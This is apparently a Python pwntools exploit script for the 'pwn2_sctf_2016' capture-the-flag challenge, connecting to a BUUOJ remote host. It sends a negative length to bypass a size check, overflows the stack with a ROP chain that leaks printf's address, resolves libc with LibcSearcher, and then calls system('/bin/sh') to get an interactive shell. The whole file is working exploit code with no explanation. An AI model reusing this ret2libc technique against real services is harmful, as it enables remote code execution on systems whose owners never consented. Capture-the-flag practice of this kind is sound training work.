from LibcSearcher import LibcSearcher
from pwn import *


def pwn2_sctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/pwn2_sctf_2016'):
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 27857)
    target_elf = ELF(file_name)

    printf_plt = p32(target_elf.plt['printf'])
    printf_got = p32(target_elf.got['printf'])
    vuln_addr = p32(target_elf.symbols['vuln'])

    pop_ret_gadget = p32(0x0804835d)  # pop ebx ; ret

    payload_1 = b'A' * (0x2C + 0x4)
    # printf(printf_got)
    payload_1 += printf_plt + pop_ret_gadget + printf_got
    # vuln()
    payload_1+=vuln_addr

    target.sendlineafter(b'to read? ', b'-1')
    target.sendlineafter(b'data!\n', payload_1)

    print(target.recvline())
    printf_addr = u32(target.recv(4))
    print(hex(printf_addr))

    searcher = LibcSearcher('printf', printf_addr)
    libc_base_addr = printf_addr - searcher.dump('printf')
    system_addr = p32(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p32(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (0x2C + 0x4)
    # system(/bin/sh)
    payload_2 += system_addr + pop_ret_gadget + bin_sh_addr

    # gdb.attach(target)
    target.sendlineafter(b'to read? ', b'-1')
    target.sendlineafter(b'data!\n', payload_2)

    target.interactive()


if __name__ == '__main__':
    pwn2_sctf_2016()
